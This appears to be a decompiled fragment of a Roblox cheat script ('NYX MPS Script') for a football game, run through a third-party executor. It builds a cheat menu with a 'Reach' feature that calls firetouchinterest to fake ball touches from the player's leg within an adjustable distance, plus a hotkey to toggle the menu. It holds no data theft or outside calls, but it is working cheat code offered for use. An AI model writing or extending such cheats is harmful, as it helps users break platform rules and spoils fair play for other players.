        v172.Position = UDim2.new(0, _TouchEnabled and 5 or 10, 1, _TouchEnabled and -50 or -80)

        local v176 = u88(p170, 'User Information')

        u130(v176, 'Username: ' .. _LocalPlayer.Name)
        u130(v176, 'Display Name: ' .. _LocalPlayer.DisplayName)
        u130(v176, 'Access Method: Free')
        u130(v176, 'Executor: ' .. u38())

        local v177 = u88(p170, 'Game Stats')

        u130(v177, 'Server Players: ' .. #_Players:GetPlayers())
        u130(v177, 'Ping: ' .. u134())
    end)
    v169('Main', function(p178)
        local v179 = u88(p178, 'Main Features')

        u99(v179, 'Reach', function(p180)
            u135 = p180

            if not u135 then
                u136 = 2
            end

            u37('Reach ' .. (p180 and 'Enabled' or 'Disabled'), 0, 'success')
        end)
        u120(v179, 'Reach', 1, 30, 2, function(p181)
            u136 = p181

            u37('Reach set to: ' .. string.format('%.1f', p181), 0, 'success')
        end)
        _UserInputService.InputBegan:Connect(function(p182, p183)
            if p182.KeyCode ~= Enum.KeyCode.W and (p182.KeyCode ~= Enum.KeyCode.A and (p182.KeyCode ~= Enum.KeyCode.S and (p182.KeyCode ~= Enum.KeyCode.D and p182.KeyCode ~= Enum.KeyCode.Space))) then
                if not p183 then
                    if p182.KeyCode == Enum.KeyCode.LeftControl then
                        u139 = not u139
                    end
                    if p182.KeyCode == Enum.KeyCode.PageUp or p182.KeyCode == Enum.KeyCode.PageDown then
                        if p182.KeyCode ~= Enum.KeyCode.PageDown then
                            u136 = math.min(30, u136 + 0.25)
                        else
                            u136 = math.max(1, u136 - 0.25)
                        end

                        u37('Reach set to: ' .. string.format('%.1f', u136), 0, 'success')
                    else
                        u152(false)
                    end
                    if u135 and _LocalPlayer.Character then
                        local v184 = u139 and 'Right Leg' or 'Left Leg'
                        local v185 = _LocalPlayer.Character:FindFirstChild(v184)

                        if v185 then
                            local _Position = v185.Position
                            local v187, v188, v189 = pairs(u137)

                            while true do
                                local u190

                                v189, u190 = v187(v188, v189)

                                if v189 == nil then
                                    break
                                end
                                if u190:IsA('BasePart') and (u190.Position - _Position).Magnitude <= u136 then
                                    local v191, v192, v193 = pairs(u140)

                                    while true do
                                        local u194

                                        v193, u194 = v191(v192, v193)

                                        if v193 == nil then
                                            break
                                        end
                                        if u194.Parent ~= _LocalPlayer.Character.Head and u194:IsA('TouchTransmitter') and u194.Parent:IsA('BasePart') then
                                            local v195, v196 = pcall(function()
                                                firetouchinterest(u190, u194.Parent, 0)
                                                task.wait()
                                                firetouchinterest(u190, u194.Parent, 1)
                                            end)

                                            if not v195 then
                                                print('Error in firetouchinterest: ' .. tostring(v196))
                                            end
                                        end
                                    end
                                end
                            end
                        else
                            print('Error: Character or ' .. v184 .. ' missing')
                        end
                    end
                end
            end
        end)
    end)
    v169('Settings', function(p197)
        local v198 = u88(p197, 'Settings')
        local _Frame16 = Instance.new('Frame')

        _Frame16.Size = UDim2.new(1, 0, 0, _TouchEnabled and 10 or 20)
        _Frame16.BackgroundTransparency = 1
        _Frame16.Parent = v198

        local _RightControl = Enum.KeyCode.RightControl
        local u201 = false
        local u202 = u126(v198, 'Change Hotkey', function()
            if not u201 then
                u201 = true
                hotkeyButton.Text = 'Press a key...'
            end
        end)

        _UserInputService.InputBegan:Connect(function(p203, p204)
            if not p204 then
                if u201 and p203.UserInputType == Enum.UserInputType.Keyboard then
                    _RightControl = p203.KeyCode
                    u202.Text = 'Hotkey: ' .. _RightControl.Name
                    u201 = false

                    u37('Hotkey updated to: ' .. _RightControl.Name, 0, 'success')
                elseif p203.KeyCode == _RightControl and _ScreenGui3 then
                    _ScreenGui3.Enabled = not _ScreenGui3.Enabled

                    u37(_ScreenGui3.Enabled and 'UI Shown' or 'UI Hidden', 0, 'success')
                end
            end
        end)
    end)
    u75[1].button.MouseButton1Click()
    game:GetService("StarterGui"):SetCore('SendNotification', {
        Title = 'Script Loaded',
        Text = 'Enjoy! Toggle UI with RightControl',
        Duration = 5,
    })
    print('NYX MPS Script loaded successfully!')
    print('97rn was here')
else
    game:GetService("StarterGui"):SetCore('SendNotification', {
        Title = 'Unsupported Game',
        Text = 'This game is not supported. Make sure you execute on the pitch, not in the hub.',
        Duration = 5,
    })
end
